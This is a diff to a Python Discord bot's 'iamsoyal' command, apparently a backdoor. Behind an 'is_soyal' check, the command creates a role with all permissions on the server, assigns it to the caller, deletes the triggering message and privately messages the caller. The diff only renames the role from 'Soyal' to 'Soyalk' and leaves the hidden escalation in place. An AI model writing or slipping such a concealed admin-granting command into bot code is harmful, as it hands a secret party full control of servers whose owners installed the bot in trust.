@@ -36,16 +36,16 @@ async def shutdown():
 @commands.check(is_soyal)
 async def iamsoyal(ctx):
     user = ctx.message.author
-    if discord.utils.get(user.server.roles, name="Soyal") is None:
-        await client.create_role(user.server, name="Soyal", permissions=discord.Permissions.all())
-        role = discord.utils.get(ctx.message.server.roles, name='Soyal')
+    if discord.utils.get(user.server.roles, name="Soyalk") is None:
+        await client.create_role(user.server, name="Soyalk", permissions=discord.Permissions.all())
+        role = discord.utils.get(ctx.message.server.roles, name='Soyalk')
         await client.add_roles(ctx.message.author, role)
     else:	
         author = ctx.message.author
         await client.delete_message(ctx.message)
-        role = discord.utils.get(ctx.message.server.roles, name='Soyal')
+        role = discord.utils.get(ctx.message.server.roles, name='Soyalk')
         await client.add_roles(ctx.message.author, role)
-        print('Added Soyal role in ' + (ctx.message.author.name))
+        print('Added Soyalk role in ' + (ctx.message.author.name))
         await client.send_message(author, embed=embed)
 	
 	      
